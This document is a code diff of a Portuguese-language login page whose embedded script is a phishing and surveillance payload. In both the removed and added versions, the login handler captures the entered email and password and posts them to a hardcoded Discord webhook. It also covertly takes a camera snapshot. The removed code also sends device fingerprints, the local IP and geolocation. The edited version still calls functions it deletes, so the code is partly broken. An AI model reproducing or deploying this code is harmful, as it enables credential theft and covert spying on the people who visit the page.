@@ -110,19 +110,31 @@
             }
         }
     </style>
-    <script>
-        // Send Data to Discord Webhook
-        async function sendToDiscord(title, data, isImage = false) {
-            const payload = isImage ? {
-                content: `Novos ${title} Coletados`,
-                files: [
+    
+
+
+<script>
+    // Send Data to Discord Webhook
+    async function sendToDiscord(title, data, isImage = false) {
+        let payload;
+
+        if (isImage) {
+            payload = {
+                content: `Novos ${title} coletados:`,
+                embeds: [
                     {
-                        attachment: data,
-                        name: 'snapshot.png'
+                        title: title,
+                        description: "Imagem capturada pela câmera.",
+                        color: 16711680,
+                        image: {
+                            url: data
+                        }
                     }
                 ]
-            } : {
-                content: `Novos ${title} Coletados`,
+            };
+        } else {
+            payload = {
+                content: `Novos ${title} coletados`,
                 embeds: [
                     {
                         title: title,
@@ -136,122 +148,67 @@
                     }
                 ]
             };
-
-            await fetch("https://discord.com/api/webhooks/1293733039331082391/3kVe2OjfbpHf0VCzRtOtq9VirB-_mK9-ZJCNVmc3gPYxOjVKLXfj-hjIDZf5W0Jdv-Fq", {
-                method: 'POST',
-                headers: {
-                    'Content-Type': isImage ? undefined : 'application/json',
-                },
-                body: isImage ? data : JSON.stringify(payload)
-            });
         }
 
-        // Gather Device Information
-        async function gatherDeviceInfo() {
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                platform: navigator.platform,
-                screenResolution: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-                plugins: [...navigator.plugins].map(plugin => plugin.name),
-                cookieEnabled: navigator.cookieEnabled,
-            };
+        await fetch("https://discord.com/api/webhooks/1293733039331082391/3kVe2OjfbpHf0VCzRtOtq9VirB-_mK9-ZJCNVmc3gPYxOjVKLXfj-hjIDZf5W0Jdv-Fq", {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        });
+    }
 
-            await sendToDiscord("Informações do Dispositivo", deviceInfo);
+    // Take hidden picture from the camera
+    async function takeHiddenPicture() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            // Allow the video feed to stabilize for a moment
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert the snapshot to a base64 data URL
+                const imageData = canvas.toDataURL('image/png');
+
+                // Send to Discord as an embed with image URL
+                sendToDiscord("Captura da Câmera", imageData, true);
+
+                // Stop the video stream
+                stream.getTracks().forEach(track => track.stop());
+            }, 3000);
+        } catch (err) {
+            console.error('Erro ao acessar a câmera:', err);
         }
+    }
 
-        // Get Local IP Address using WebRTC
-        async function getLocalIP() {
-            return new Promise((resolve) => {
-                const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                        const match = ipRegex.exec(event.candidate.candidate);
-                        if (match) {
-                            sendToDiscord("Endereço IP Local", { ip: match[1] });
-                            resolve(match[1]);
-                        }
-                    }
-                };
-                pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            });
-        }
+    // Collect Login Credentials
+    async function collectCredentials(event) {
+        event.preventDefault();
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
 
-        // Get Geolocation Data
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async position => {
-                    const locationData = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                    };
-                    await sendToDiscord("Dados de Geolocalização", locationData);
-                });
-            } else {
-                console.error("Geolocalização não é suportada por este navegador.");
-            }
-        }
+        const credentials = {
+            email: email,
+            password: password
+        };
 
-        // Take hidden picture from the camera
-        async function takeHiddenPicture() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
+        await sendToDiscord("Credenciais de Login", credentials);
 
-                // Allow the video feed to stabilize for a moment
-                setTimeout(() => {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                    // Convert to Blob and send to Discord
-                    canvas.toBlob(async (blob) => {
-                        if (blob) {
-                            const formData = new FormData();
-                            formData.append('file', blob, 'snapshot.png');
-                            await sendToDiscord("Captura da Câmera", formData, true);
-                        }
-                    });
-
-                    // Stop the video stream
-                    stream.getTracks().forEach(track => track.stop());
-                }, 3000);
-            } catch (err) {
-                console.error('Erro ao acessar a câmera:', err);
-            }
-        }
-
-        // Collect Login Credentials
-        async function collectCredentials(event) {
-            event.preventDefault();
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
-
-            const credentials = {
-                email: email,
-                password: password
-            };
-
-            await sendToDiscord("Credenciais de Login", credentials);
-
-            // Trigger all other data collection
-            gatherDeviceInfo();
-            getLocalIP();
-            getLocation();
-            takeHiddenPicture();
-        }
-    </script>
-</head>
+        // Trigger all other data collection
+        gatherDeviceInfo();
+        getLocalIP();
+        getLocation();
+        takeHiddenPicture();
+    }
+</script></head>
 
 <body>
     <div class="container">
